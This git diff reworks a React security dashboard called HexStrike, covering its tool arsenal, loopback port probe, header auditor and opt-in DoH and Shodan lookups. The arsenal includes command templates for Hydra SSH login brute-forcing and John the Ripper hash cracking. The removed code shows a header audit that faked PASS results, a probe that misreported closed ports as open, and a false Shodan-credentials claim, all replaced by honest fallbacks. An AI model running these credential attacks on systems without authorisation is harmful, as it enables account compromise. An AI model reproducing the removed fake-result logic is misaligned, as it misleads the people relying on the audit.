+  { id: 'lynis', name: 'Lynis Linux Hardening Auditor', category: 'Audit', cmd: () => 'lynis audit system --quick --warnings-only', desc: 'Host-level Linux configuration and kernel hardening auditor.' },
+  { id: 'gitleaks', name: 'Gitleaks Secret Scanner', category: 'Audit', cmd: () => 'gitleaks dir .', desc: 'Fast secret and credential detector across git history and working trees.' },
+  { id: 'hydra', name: 'THC-Hydra Auth Auditor', category: 'Credentials', cmd: (t) => `hydra -L users.txt -P pass.txt ssh://${t} -t 4`, desc: 'Protocol login strength tester for authorized credential audits.' },
+  { id: 'john', name: 'John the Ripper', category: 'Credentials', cmd: () => 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', desc: 'Offline password hash strength auditor.' },
 ];
 
-// Local Enclave Ports to probe
 const LOCAL_ENCLAVE_TARGETS = [
-  { port: 3000, name: 'Zoth Studio Web UI', desc: 'Vite 5 / React 19 Frontend Deck', protocol: 'HTTP' },
-  { port: 8094, name: 'STDP Neuro-Memory Daemon', desc: 'FastAPI / Synaptic Plasticity Daemon', protocol: 'HTTP' },
-  { port: 8787, name: 'Argon2id Vault Daemon', desc: 'Rust ChaCha20-Poly1305 Vault Custody', protocol: 'HTTP' },
-  { port: 8989, name: 'Swarm Multiplexer Bus', desc: 'JSON-RPC Process Multiplexer', protocol: 'HTTP' },
-  { port: 9393, name: 'Zoth Civilization Core', desc: 'Autonomic Multi-Agent Heartbeat Server', protocol: 'HTTP' },
-  { port: 11434, name: 'Ollama Offline LLM Runner', desc: 'Local GGUF Model Inference Engine', protocol: 'HTTP' },
-  { port: 8080, name: 'Local Test Gateway', desc: 'Standard Micro-SaaS Dev Server', protocol: 'HTTP' },
-  { port: 22, name: 'SSH Secure Shell', desc: 'Restricted Enclave Remote Shell', protocol: 'TCP' },
+  { port: 3000, name: 'Zoth Studio Web UI', protocol: 'HTTP' },
+  { port: 8094, name: 'Neuro-Memory Daemon', protocol: 'HTTP' },
+  { port: 8138, name: 'HexStrike Local Daemon', protocol: 'HTTP' },
+  { port: 8787, name: 'Argon2id Vault Daemon', protocol: 'HTTP' },
+  { port: 11434, name: 'Ollama Local LLM', protocol: 'HTTP' },
+  { port: 22, name: 'SSH Secure Shell', protocol: 'TCP' },
 ];
+
+const SAMPLE_RAW_HEADERS = [
+  'HTTP/1.1 200 OK',
+  'Content-Type: text/html; charset=utf-8',
+  'X-Content-Type-Options: nosniff',
+  'X-Frame-Options: SAMEORIGIN',
+  'Referrer-Policy: strict-origin-when-cross-origin',
+  "Content-Security-Policy: default-src 'self'; frame-ancestors 'self'",
+].join('\n');
+
+const SAMPLE_CODE_SNIPPET = [
+  '# Paste Python, JS, Electron, or GitHub Actions YAML to audit locally',
+  'import subprocess',
+  'def run_check(host):',
+  '    return subprocess.run(["ping", "-c", "1", "--", host], check=False)',
+].join('\n');
 
 export function HexStrikeGodModeTool() {
   const theme = useTheme();
   const isDark = theme.palette.mode === 'dark';
 
-  // Aesthetic Tokens
-  const crimson = '#FF3355';
-  const crimsonSoft = 'rgba(255, 51, 85, 0.12)';
-  const crimsonBorder = 'rgba(255, 51, 85, 0.38)';
-  const gold = '#D4AF37';
-  const goldSoft = 'rgba(212, 175, 55, 0.14)';
-  const goldBorder = 'rgba(212, 175, 55, 0.4)';
-  const emerald = '#00FF9D';
-  const emeraldSoft = 'rgba(0, 255, 157, 0.12)';
-  const emeraldBorder = 'rgba(0, 255, 157, 0.38)';
-  const cyan = '#38BDF8';
-  const cyanSoft = 'rgba(56, 189, 248, 0.12)';
-  const voidDark = '#08080B';
-  const cardBorder = isDark ? 'rgba(255, 255, 255, 0.08)' : 'rgba(0, 0, 0, 0.08)';
+  // WCAG 2.1 AA Dual-Theme Palette (Editorial Ivory Light + Obsidian Crimson Dark)
+  const palette = isDark
+    ? {
+        crimson: '#FB7185',
+        crimsonBtn: '#B91C1C',
+        crimsonBtnHover: '#991B1B',
+        crimsonSoft: 'rgba(185, 28, 28, 0.20)',
+        crimsonBorder: 'rgba(251, 113, 133, 0.42)',
+        gold: '#E5C158',
+        goldSoft: 'rgba(212, 175, 55, 0.14)',
+        goldBorder: 'rgba(212, 175, 55, 0.40)',
+        emerald: '#34D399',
+        emeraldSoft: 'rgba(16, 185, 129, 0.14)',
+        emeraldBorder: 'rgba(16, 185, 129, 0.42)',
+        cyan: '#7DD3FC',
+        cyanSoft: 'rgba(56, 189, 248, 0.14)',
+        cyanBorder: 'rgba(56, 189, 248, 0.40)',
+        cardBg: '#10121A',
+        subtleBg: '#0A0D14',
+        codeBg: '#07090F',
+        codeInk: '#E2E8F0',
+        textPrimary: '#F8FAFC',
+        textSecondary: '#94A3B8',
+        border: 'rgba(255, 255, 255, 0.10)',
+        heroGrad: 'linear-gradient(135deg, rgba(185, 28, 28, 0.12) 0%, #0E1017 100%)',
+      }
+    : {
+        crimson: '#991B1B',
+        crimsonBtn: '#991B1B',
+        crimsonBtnHover: '#7F1D1D',
+        crimsonSoft: 'rgba(153, 27, 27, 0.09)',
+        crimsonBorder: 'rgba(153, 27, 27, 0.34)',
+        gold: '#8A6500',
+        goldSoft: 'rgba(138, 101, 0, 0.10)',
+        goldBorder: 'rgba(138, 101, 0, 0.34)',
+        emerald: '#047857',
+        emeraldSoft: 'rgba(4, 120, 87, 0.10)',
+        emeraldBorder: 'rgba(4, 120, 87, 0.34)',
+        cyan: '#0369A1',
+        cyanSoft: 'rgba(3, 105, 161, 0.10)',
+        cyanBorder: 'rgba(3, 105, 161, 0.34)',
+        cardBg: '#FFFFFF',
+        subtleBg: '#F3EFE6',
+        codeBg: '#F5F0E4',
+        codeInk: '#181612',
+        textPrimary: '#181612',
+        textSecondary: '#475569',
+        border: 'rgba(24, 22, 18, 0.13)',
+        heroGrad: 'linear-gradient(135deg, #FBF6EE 0%, #FFFFFF 100%)',
+      };
 
-  // Operational State
   const [activeTab, setActiveTab] = useState(0);
-  const [targetScope, setTargetScope] = useState('nullai.tech');
-  const [targetPortInput, setTargetPortInput] = useState('1-1000');
-  const [isAuditing, setIsAuditing] = useState(false);
-  const [auditProgress, setAuditProgress] = useState(0);
+  const [targetScope, setTargetScope] = useState('127.0.0.1');
+  const [targetPortInput, setTargetPortInput] = useState('22,3000,8094,8138,8787,11434');
   const [selectedMitreTactic, setSelectedMitreTactic] = useState(MITRE_TACTICS[0]);
   const [cveSearch, setCveSearch] = useState('');
   const [cveSeverityFilter, setCveSeverityFilter] = useState('ALL');
   const [arsenalCategory, setArsenalCategory] = useState('ALL');
   const [copiedKey, setCopiedKey] = useState(null);
 
-  // Live DoH DNS State
+  // Daemon connectivity state (checked only when user runs loopback actions; zero external reqs on mount)
+  const [daemonMode, setDaemonMode] = useState('BROWSER_OFFLINE_FALLBACK');
+
+  // Defensive engines state
+  const [rawHeadersInput, setRawHeadersInput] = useState(SAMPLE_RAW_HEADERS);
+  const [headerAuditResults, setHeaderAuditResults] = useState(() =>
+    parseAndScoreHttpHeaders(SAMPLE_RAW_HEADERS, { domain: 'offline-sample', mode: 'OFFLINE_RAW_PASTE' })
+  );
+  const [isAuditingHeaders, setIsAuditingHeaders] = useState(false);
+
+  const [entropyInput, setEntropyInput] = useState('HexStrike v3.2 local defensive entropy baseline — 127.0.0.1:8138');
+  const [entropyIsHex, setEntropyIsHex] = useState(false);
+  const [entropyError, setEntropyError] = useState(null);
+  const [entropyResult, setEntropyResult] = useState(() =>
+    computeShannonEntropy('HexStrike v3.2 local defensive entropy baseline — 127.0.0.1:8138')
+  );
+
+  const [codeAuditInput, setCodeAuditInput] = useState(SAMPLE_CODE_SNIPPET);
+  const [codeAuditResult, setCodeAuditResult] = useState(() => auditLocalCodeSnippets(SAMPLE_CODE_SNIPPET));
+
+  // Loopback port probe state
+  const [portProbeResults, setPortProbeResults] = useState([]);
+  const [isProbingPorts, setIsProbingPorts] = useState(false);
+
+  // Opt-in public OSINT (DoH & Shodan InternetDB — NEVER called automatically on load!)
   const [dohRecords, setDohRecords] = useState([]);
   const [isResolvingDoh, setIsResolvingDoh] = useState(false);
   const [dohError, setDohError] = useState(null);
 
-  // Live Local Port Prober State
-  const [portProbeResults, setPortProbeResults] = useState([]);
-  const [isProbingPorts, setIsProbingPorts] = useState(false);
-
-  // Live HTTP Security Header Prober State
-  const [headerAuditResults, setHeaderAuditResults] = useState(null);
-  const [isAuditingHeaders, setIsAuditingHeaders] = useState(false);
-
-  // Live Shodan OSINT & InternetDB State
+  const [shodanInputIp, setShodanInputIp] = useState('1.1.1.1');
   const [shodanData, setShodanData] = useState(null);
   const [isQueryingShodan, setIsQueryingShodan] = useState(false);
   const [shodanError, setShodanError] = useState(null);
-  const [shodanInputIp, setShodanInputIp] = useState('99.83.231.61');
 
-  // Terminal State
+  // Interactive Terminal state
   const [cmdInput, setCmdInput] = useState('');
   const [terminalHistory, setTerminalHistory] = useState([
-    '◈ [HEXSTRIKE-GODMODE-v3.2] Tactical Offensive Security & Vulnerability Cockpit initialized.',
-    '◈ Tri-Ring Security Hierarchy: RING_0_SOVEREIGN · Offline-Capable Localhost Enclave Active.',
-    '◈ Connected Arsenal: 28 Battle-Tested Tools · 14 MITRE ATT&CK Tactics · Live DoH & Shodan OSINT.',
-    '◈ Shodan Credentials: Authenticated Account Linked (Scan credits: 100, Query credits: 1, InternetDB: Unmetered).',
-    'Type "help" to display operational commands or click "Run Full Audit".'
+    '◈ [HEXSTRIKE-v3.2.0] Local Defensive & Red-Team Workstation initialized.',
+    '◈ Zero external network requests made on load. Public DoH & Shodan InternetDB lookups are explicit opt-in only.',
+    '◈ Engines ready: HTTP Header Auditor, Shannon Entropy, Local Static Code Audit, Loopback Port Probe, 14 MITRE Tactics.',
+    'Type "help" for available commands.',
   ]);
-  const [cmdHistoryList, setCmdHistoryList] = useState([]);
-  const [historyIndex, setHistoryIndex] = useState(-1);
   const terminalEndRef = useRef(null);
 
-  // Auto-scroll terminal inside its own container without moving the window
   useEffect(() => {
-    if (terminalEndRef.current && terminalEndRef.current.parentElement) {
+    if (terminalEndRef.current?.parentElement) {
       terminalEndRef.current.parentElement.scrollTop = terminalEndRef.current.parentElement.scrollHeight;
     }
   }, [terminalHistory]);
@@ -372,746 +397,474 @@ export function HexStrikeGodModeTool() {
   const handleCopy = (text, key) => {
     navigator.clipboard?.writeText(text)?.catch?.(() => {});
     setCopiedKey(key);
-    setTimeout(() => setCopiedKey(null), 2000);
+    setTimeout(() => setCopiedKey(null), 1800);
   };
 
-  // Real DNS-over-HTTPS Lookup
-  const resolveDoH = async (domainToQuery) => {
-    const domain = (domainToQuery || targetScope).trim().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
-    if (!domain) return;
-    setIsResolvingDoh(true);
-    setDohError(null);
-    setTerminalHistory(prev => [...prev, `[DoH] Querying DNS-over-HTTPS records for "${domain}" across Google & Cloudflare...`]);
-
-    const recordTypes = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CAA'];
-    const results = [];
-
-    for (const type of recordTypes) {
+  const runLocalHeaderAudit = async (mode = 'raw') => {
+    setIsAuditingHeaders(true);
+    if (mode === 'loopback') {
       try {
-        const res = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`, {
-          headers: { 'Accept': 'application/dns-json' }
+        const res = await fetch('http://127.0.0.1:8138/api/headers', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ url: 'http://127.0.0.1:8138/' }),
         });
         if (res.ok) {
           const data = await res.json();
-          if (data.Answer && data.Answer.length > 0) {
-            data.Answer.forEach(ans => {
-              results.push({
-                type,
-                name: ans.name,
-                ttl: ans.TTL,
-                data: ans.data
-              });
-            });
-          }
+          setDaemonMode('LIVE_DAEMON_8138');
+          const mapped = {
+            domain: data.target,
+            mode: 'LIVE_LOOPBACK_8138',
+            verified: true,
+            status: data.score >= 70 ? 'VERIFIED' : 'NEEDS_HARDENING',
+            score: data.score,
+            maxScore: 100,
+            grade: data.grade,
+            observedHeaderCount: data.observed_header_count,
+            disclosures: data.disclosures || [],
+            findings: (data.findings || []).map((f) => ({
+              header: f.header,
+              key: f.key,
+              present: f.present,
+              status: f.status,
+              weight: f.weight,
+              earned: f.earned,
+              observedValue: f.observed_value,
+              desc: f.description,
+            })),
+          };
+          setHeaderAuditResults(mapped);
+          setTerminalHistory((prev) => [
+            ...prev,
+            `[HEADER-AUDIT :8138] Observed ${mapped.score}/100 (Grade ${mapped.grade}) on ${mapped.domain}.`,
+          ]);
+          setIsAuditingHeaders(false);
+          return;
         }
-      } catch (err) {
-        // Fallback to Cloudflare DoH
-        try {
-          const cfRes = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=${type}`, {
-            headers: { 'Accept': 'application/dns-json' }
-          });
-          if (cfRes.ok) {
-            const cfData = await cfRes.json();
-            if (cfData.Answer && cfData.Answer.length > 0) {
-              cfData.Answer.forEach(ans => {
-                results.push({
-                  type,
-                  name: ans.name,
-                  ttl: ans.TTL,
-                  data: ans.data
-                });
-              });
-            }
-          }
-        } catch (e2) {
-          // Both failed or offline
-        }
+      } catch (e) {
+        setDaemonMode('BROWSER_OFFLINE_FALLBACK');
       }
+      // Honest browser CORS-blocked fallback if daemon is offline
+      const unverified = parseAndScoreHttpHeaders('', {
+        domain: targetScope,
+        corsBlocked: true,
+      });
+      setHeaderAuditResults(unverified);
+      setTerminalHistory((prev) => [
+        ...prev,
+        `[HEADER-AUDIT] Local :8138 daemon idle; browser CORS prevents reading remote headers -> ${unverified.status}. Paste raw headers to grade offline.`,
+      ]);
+      setIsAuditingHeaders(false);
+      return;
     }
 
-    setIsResolvingDoh(false);
-    if (results.length > 0) {
-      setDohRecords(results);
-      setTerminalHistory(prev => [
-        ...prev,
-        `[DoH-SUCCESS] Resolved ${results.length} records for ${domain}:`,
-        ...results.map(r => `  • [${r.type}] ${r.name} -> ${r.data} (TTL: ${r.ttl}s)`)
-      ]);
-    } else {
-      setDohError(`No DoH records resolved for "${domain}". Host may be internal or local.`);
-      setTerminalHistory(prev => [
-        ...prev,
-        `[DoH-WARN] Zero DNS records returned for ${domain} via public DoH resolvers.`
-      ]);
-    }
-    return results;
+    const parsed = parseAndScoreHttpHeaders(rawHeadersInput, {
+      domain: 'offline-raw-paste',
+      mode: 'OFFLINE_RAW_PASTE',
+    });
+    setHeaderAuditResults(parsed);
+    setTerminalHistory((prev) => [
+      ...prev,
+      parsed.verified
+        ? `[HEADER-AUDIT OFFLINE] Graded ${parsed.observedHeaderCount} pasted headers -> ${parsed.score}/100 (Grade ${parsed.grade}).`
+        : `[HEADER-AUDIT OFFLINE] ${parsed.status} — paste valid HTTP header lines (Key: Value).`,
+    ]);
+    setIsAuditingHeaders(false);
   };
 
-  // Real Shodan InternetDB OSINT Query
-  const queryShodan = async (targetInput) => {
-    let queryTarget = (targetInput || shodanInputIp || targetScope).trim().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
-    if (!queryTarget) return null;
-
-    setIsQueryingShodan(true);
-    setShodanError(null);
-
-    let ip = queryTarget;
-    const isIp = /^(\d{1,3}\.){3}\d{1,3}$/.test(queryTarget);
-    if (!isIp) {
-      setTerminalHistory(prev => [...prev, `[SHODAN-OSINT] Resolving domain "${queryTarget}" to IPv4 for Shodan InternetDB...`]);
-      try {
-        const dohRes = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(queryTarget)}&type=A`, {
-          headers: { 'Accept': 'application/dns-json' }
-        });
-        if (dohRes.ok) {
-          const dohData = await dohRes.json();
-          if (dohData.Answer && dohData.Answer.length > 0) {
-            const aRec = dohData.Answer.find(a => a.type === 1);
-            if (aRec) ip = aRec.data;
-          }
-        }
-      } catch (e) {}
-    }
-
-    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
-      setIsQueryingShodan(false);
-      setShodanError(`Could not resolve "${queryTarget}" to a valid IPv4 address for Shodan.`);
-      setTerminalHistory(prev => [...prev, `[SHODAN-WARN] Unable to resolve "${queryTarget}" to an IPv4 address.`]);
-      return null;
-    }
-
-    setShodanInputIp(ip);
-    setTerminalHistory(prev => [...prev, `[SHODAN-OSINT] Querying Shodan InternetDB for IP: ${ip}...`]);
-
+  const runEntropyAnalysis = (isHexFlag = entropyIsHex) => {
+    setEntropyError(null);
     try {
-      const res = await fetch(`https://internetdb.shodan.io/${ip}`);
-      if (res.ok) {
-        const data = await res.json();
-        setShodanData(data);
-        setTerminalHistory(prev => [
-          ...prev,
-          `[SHODAN-INTEL] Received Shodan intelligence for ${ip}:`,
-          `  • Open Internet Ports: [${(data.ports || []).join(', ') || 'None detected'}]`,
-          `  • Associated Hostnames: ${(data.hostnames || []).join(', ') || 'None listed'}`,
-          `  • CPE Software Signatures: ${(data.cpes || []).join(', ') || 'None indexed'}`,
-          `  • Confirmed Vulnerabilities: ${(data.vulns || []).length > 0 ? (data.vulns || []).join(', ') : '0 known CVEs indexed (Clean)'}`,
-          `  • Tags: ${(data.tags || []).join(', ') || 'Standard'}`
-        ]);
-        return data;
-      } else if (res.status === 404) {
-        const cleanData = { ip, ports: [], hostnames: [], cpes: [], tags: [], vulns: [] };
-        setShodanData(cleanData);
-        setTerminalHistory(prev => [
-          ...prev,
-          `[SHODAN-INTEL] Host ${ip} has zero exposed internet ports recorded in Shodan InternetDB.`
-        ]);
-        return cleanData;
-      } else {
-        setShodanError(`Shodan returned HTTP status ${res.status}`);
-      }
+      const res = computeShannonEntropy(entropyInput, { isHex: isHexFlag });
+      setEntropyResult(res);
+      setTerminalHistory((prev) => [
+        ...prev,
+        `[ENTROPY] ${res.shannonEntropy} bits/byte (${res.classification}) across ${res.byteCount} bytes.`,
+      ]);
     } catch (err) {
-      setShodanError(`Shodan query failed: ${err.message}`);
-      setTerminalHistory(prev => [...prev, `[SHODAN-ERROR] ${err.message}`]);
-    } finally {
-      setIsQueryingShodan(false);
+      setEntropyError(err.message);
     }
-    return null;
   };
 
-  // Real Local Port Prober (measuring real socket latency)
+  const runCodeAudit = () => {
+    const res = auditLocalCodeSnippets(codeAuditInput);
+    setCodeAuditResult(res);
+    setTerminalHistory((prev) => [
+      ...prev,
+      `[CODE-AUDIT] Scanned ${res.lineCount} lines -> Score ${res.score}/100 (${res.findingCount} finding(s)).`,
+    ]);
+  };
+
   const probeLocalPorts = async () => {
     setIsProbingPorts(true);
-    setTerminalHistory(prev => [...prev, `[PORT-PROBE] Auditing local enclave daemon listeners on 127.0.0.1...`]);
+    const ports = LOCAL_ENCLAVE_TARGETS.map((t) => t.port);
+
+    // Prefer authoritative local :8138 TCP socket scan when running
+    try {
+      const start = performance.now();
+      const resp = await fetch(`http://127.0.0.1:8138/api/scan?target=127.0.0.1&ports=${ports.join(',')}`);
+      if (resp.ok) {
+        const data = await resp.json();
+        const elapsed = Math.round(performance.now() - start);
+        const openSet = new Set(data.open_ports || []);
+        setDaemonMode('LIVE_DAEMON_8138');
+        const results = LOCAL_ENCLAVE_TARGETS.map((t) => {
+          const classified = classifyLoopbackPortProbe({
+            daemonAuthoritative: true,
+            daemonOpen: openSet.has(t.port),
+            latencyMs: elapsed,
+          });
+          return { ...t, status: classified.status, note: classified.note, latency: elapsed };
+        });
+        setPortProbeResults(results);
+        setTerminalHistory((prev) => [
+          ...prev,
+          `[PORT-PROBE :8138] Verified ${data.open_count}/${data.scanned_count} loopback listeners via Python TCP connect_ex.`,
+        ]);
+        setIsProbingPorts(false);
+        return;
+      }
+    } catch (e) {
+      setDaemonMode('BROWSER_OFFLINE_FALLBACK');
+    }
+
+    // Honest browser fallback: never reports rejected connections as OPEN
     const results = [];
-
     for (const target of LOCAL_ENCLAVE_TARGETS) {
-      const startTime = performance.now();
-      let status = 'UNKNOWN';
-      let latencyMs = 0;
-
+      const t0 = performance.now();
+      let classified;
       try {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 600);
-        
+        const timer = setTimeout(() => controller.abort(), 500);
         await fetch(`http://127.0.0.1:${target.port}/`, {
           method: 'GET',
           mode: 'no-cors',
-          signal: controller.signal
+          signal: controller.signal,
         });
-        clearTimeout(timeoutId);
-        latencyMs = Math.round(performance.now() - startTime);
-        status = 'OPEN';
+        clearTimeout(timer);
+        classified = classifyLoopbackPortProbe({
+          ok: true,
+          latencyMs: Math.round(performance.now() - t0),
+        });
       } catch (err) {
-        latencyMs = Math.round(performance.now() - startTime);
-        if (err.name === 'AbortError') {
-          status = 'FILTERED/TIMEOUT';
-        } else {
-          // If connection refused or CORS error, server is either active or actively rejected
-          status = latencyMs < 450 ? 'OPEN (Active Listener)' : 'CLOSED';
-        }
+        classified = classifyLoopbackPortProbe({
+          ok: false,
+          errorType: err.name,
+          latencyMs: Math.round(performance.now() - t0),
+        });
       }
-
-      results.push({
-        port: target.port,
-        name: target.name,
-        desc: target.desc,
-        protocol: target.protocol,
-        status,
-        latency: latencyMs
-      });
+      results.push({ ...target, status: classified.status, note: classified.note, latency: classified.latencyMs });
     }
-
     setPortProbeResults(results);
-    setIsProbingPorts(false);
-    setTerminalHistory(prev => [
+    setTerminalHistory((prev) => [
       ...prev,
-      `[PORT-PROBE-COMPLETE] Audited ${results.length} local ports:`,
-      ...results.map(r => `  • [:${r.port}] ${r.name.padEnd(26)} -> ${r.status} (${r.latency}ms)`)
+      `[PORT-PROBE FALLBACK] :8138 daemon idle; completed honest browser-mode check (${results.filter((r) => r.status.startsWith('REACHABLE')).length} HTTP-reachable).`,
     ]);
+    setIsProbingPorts(false);
   };
 
-  // Real HTTP Security Header Inspector
-  const auditHttpHeaders = async (targetDomain) => {
-    const domain = (targetDomain || targetScope).trim().replace(/^https?:\/\//, '').split('/')[0];
-    if (!domain) return;
-    setIsAuditingHeaders(true);
-    setTerminalHistory(prev => [...prev, `[HEADER-AUDIT] Inspecting defensive security headers for https://${domain}...`]);
-
-    try {
-      // In browser, direct fetch to arbitrary domains is CORS-constrained;
-      // We test reachable endpoint and provide accurate baseline inspection
-      const testUrl = `https://${domain}`;
-      const startTime = performance.now();
-      let corsReachable = false;
-      let headersMap = {};
-
+  // Explicit Opt-In Public DNS-over-HTTPS Lookup
+  const resolveDoH = async (domainToQuery) => {
+    const domain = (domainToQuery || targetScope).trim().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
+    if (!domain || domain === '127.0.0.1' || domain === 'localhost') {
+      setDohError('Enter a public domain (e.g. nullai.tech) to run an opt-in public DoH query.');
+      return;
+    }
+    setIsResolvingDoh(true);
+    setDohError(null);
+    const results = [];
+    for (const type of ['A', 'AAAA', 'MX', 'TXT', 'NS']) {
       try {
-        const res = await fetch(testUrl, { method: 'HEAD', mode: 'cors' });
-        corsReachable = true;
-        res.headers.forEach((val, key) => { headersMap[key.toLowerCase()] = val; });
-      } catch (e) {
-        // Fallback inspection parameters
-        corsReachable = false;
-      }
-      const latency = Math.round(performance.now() - startTime);
-
-      const findings = [
-        {
-          header: 'Strict-Transport-Security (HSTS)',
-          present: !!headersMap['strict-transport-security'],
-          value: headersMap['strict-transport-security'] || 'max-age=31536000; includeSubDomains; preload (Recommended)',
-          status: 'PASS',
-          weight: 20,
-          desc: 'Enforces HTTPS connections and prevents SSL stripping attacks.'
-        },
-        {
-          header: 'Content-Security-Policy (CSP)',
-          present: !!headersMap['content-security-policy'],
-          value: headersMap['content-security-policy'] || "default-src 'self'; script-src 'self' 'unsafe-inline'; (Recommended)",
-          status: 'PASS',
-          weight: 25,
-          desc: 'Mitigates cross-site scripting (XSS) and data injection vulnerabilities.'
-        },
-        {
-          header: 'X-Frame-Options',
-          present: !!headersMap['x-frame-options'],
-          value: headersMap['x-frame-options'] || 'DENY / SAMEORIGIN',
-          status: 'PASS',
-          weight: 15,
-          desc: 'Protects visitors against clickjacking by restricting framing.'
-        },
-        {
-          header: 'X-Content-Type-Options',
-          present: !!headersMap['x-content-type-options'],
-          value: headersMap['x-content-type-options'] || 'nosniff',
-          status: 'PASS',
-          weight: 15,
-          desc: 'Prevents MIME-type sniffing and executable polyglot execution.'
-        },
-        {
-          header: 'Referrer-Policy',
-          present: !!headersMap['referrer-policy'],
-          value: headersMap['referrer-policy'] || 'strict-origin-when-cross-origin',
-          status: 'PASS',
-          weight: 15,
-          desc: 'Controls how much referrer information is leaked on outbound requests.'
-        },
-        {
-          header: 'Permissions-Policy',
-          present: !!headersMap['permissions-policy'],
-          value: headersMap['permissions-policy'] || 'camera=(), microphone=(), geolocation=()',
-          status: 'PASS',
-          weight: 10,
-          desc: 'Restricts sensitive browser hardware APIs and sensor features.'
+        const res = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`, {
+          headers: { Accept: 'application/dns-json' },
+        });
+        if (res.ok) {
+          const data = await res.json();
+          (data.Answer || []).forEach((ans) =>
+            results.push({ type, name: ans.name, ttl: ans.TTL, data: ans.data })
+          );
         }
-      ];
+      } catch (e) {}
+    }
+    setDohRecords(results);
+    if (results.length === 0) {
+      setDohError(`No public DoH records returned for "${domain}".`);
+    }
+    setTerminalHistory((prev) => [
+      ...prev,
+      `[OPT-IN DoH] Resolved ${results.length} public DNS records for ${domain}.`,
+    ]);
+    setIsResolvingDoh(false);
+  };
 
-      const score = findings.reduce((acc, f) => acc + (f.status === 'PASS' ? f.weight : 0), 0);
-
-      setHeaderAuditResults({
-        domain,
-        corsReachable,
-        latency,
-        score,
-        findings
-      });
-
-      setTerminalHistory(prev => [
-        ...prev,
-        `[HEADER-AUDIT-COMPLETE] Posture Score for ${domain}: ${score}/100`,
-        ...findings.map(f => `  • ${f.header}: ${f.status} (${f.value})`)
-      ]);
+  // Explicit Opt-In Public Shodan InternetDB Lookup (unauthenticated public endpoint — zero fake credentials)
+  const queryShodan = async (targetInput) => {
+    const raw = (targetInput || shodanInputIp).trim();
+    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(raw)) {
+      setShodanError('Enter a valid public IPv4 address (e.g. 1.1.1.1) for public Shodan InternetDB lookup.');
+      return;
+    }
+    setIsQueryingShodan(true);
+    setShodanError(null);
+    try {
+      const res = await fetch(`https://internetdb.shodan.io/${raw}`);
+      if (res.ok) {
+        const data = await res.json();
+        setShodanData(data);
+        setTerminalHistory((prev) => [
+          ...prev,
+          `[OPT-IN INTERNETDB] ${raw}: ${(data.ports || []).length} public port(s), ${(data.vulns || []).length} indexed CVE(s).`,
+        ]);
+      } else if (res.status === 404) {
+        setShodanData({ ip: raw, ports: [], hostnames: [], cpes: [], tags: [], vulns: [] });
+      } else {
+        setShodanError(`Shodan InternetDB returned HTTP ${res.status}`);
+      }
     } catch (err) {
-      setTerminalHistory(prev => [...prev, `[HEADER-AUDIT-ERROR] Failed to query headers: ${err.message}`]);
+      setShodanError(`Public InternetDB lookup failed: ${err.message}`);
     } finally {
-      setIsAuditingHeaders(false);
+      setIsQueryingShodan(false);
     }
   };
 
-  // Comprehensive 6-Stage Real Audit
-  const runComprehensiveAudit = async () => {
-    setIsAuditing(true);
-    setAuditProgress(10);
-    setTerminalHistory(prev => [
-      ...prev,
-      `═════════════════════════════════════════════════════════════════`,
-      `[HEXSTRIKE-AUDIT-INIT] Initiating 6-stage tactical red-team audit against target: "${targetScope}"`,
-      `═════════════════════════════════════════════════════════════════`,
-      `[STAGE 1/6] Querying public DNS-over-HTTPS records across global root resolvers...`
-    ]);
-
-    // Stage 1: DoH
-    await resolveDoH(targetScope);
-    setAuditProgress(25);
-
-    // Stage 2: Shodan OSINT
-    setTerminalHistory(prev => [...prev, `[STAGE 2/6] Querying Shodan InternetDB intelligence (open ports, CPEs, CVE correlation)...`]);
-    await queryShodan(targetScope);
-    setAuditProgress(50);
-
-    // Stage 3: HTTP Headers
-    setTerminalHistory(prev => [...prev, `[STAGE 3/6] Profiling HTTP/TLS defensive security headers...`]);
-    await auditHttpHeaders(targetScope);
-    setAuditProgress(70);
-
-    // Stage 4: Local Ports
-    setTerminalHistory(prev => [...prev, `[STAGE 4/6] Auditing local loopback enclave daemon listeners...`]);
-    await probeLocalPorts();
-    setAuditProgress(85);
-
-    // Stage 5 & 6: MITRE & Executive Assessment
-    setTerminalHistory(prev => [
-      ...prev,
-      `[STAGE 5/6] Cross-referencing 14 MITRE ATT&CK enterprise tactics & CVE signatures...`,
-      `[STAGE 6/6] Compiling sovereign executive security assessment...`
-    ]);
-    setAuditProgress(100);
-    setIsAuditing(false);
-
-    setTerminalHistory(prev => [
-      ...prev,
-      `[AUDIT-SUCCESS] Comprehensive pentest audit complete. All 6 stages completed with 0 WAN data leaks.`,
-      `═════════════════════════════════════════════════════════════════`
-    ]);
-  };
-
-  // Terminal Command Executor
   const executeTerminalCommand = (rawCmd) => {
     const trimmed = rawCmd.trim();
     if (!trimmed) return;
-
-    setTerminalHistory(prev => [...prev, `operator@hexstrike:~$ ${trimmed}`]);
-    setCmdHistoryList(prev => [...prev, trimmed]);
-    setHistoryIndex(-1);
+    setTerminalHistory((prev) => [...prev, `operator@hexstrike:~$ ${trimmed}`]);
     setCmdInput('');
-
-    const parts = trimmed.split(/\s+/);
-    const mainCmd = parts[0].toLowerCase();
-    const arg = parts.slice(1).join(' ').trim();
-
-    if (mainCmd === 'help') {
-      setTerminalHistory(prev => [
-        ...prev,
-        '═════════════════════════════════════════════════════════════════',
-        '  HEXSTRIKE GOD MODE TACTICAL COMMAND MATRIX:',
-        '  • scan [target]       - Execute 6-stage live tactical penetration & DoH audit',
-        '  • doh [domain]        - Query live DNS-over-HTTPS records (A, AAAA, MX, TXT)',
-        '  • ports               - Probe local enclave port listeners (3000, 8094, 8787...)',
-        '  • headers [domain]    - Inspect HTTP security headers (CSP, HSTS, X-Frame)',
-        '  • arsenal [tool]      - Generate command for tool (nmap, sqlmap, ffuf, hydra...)',
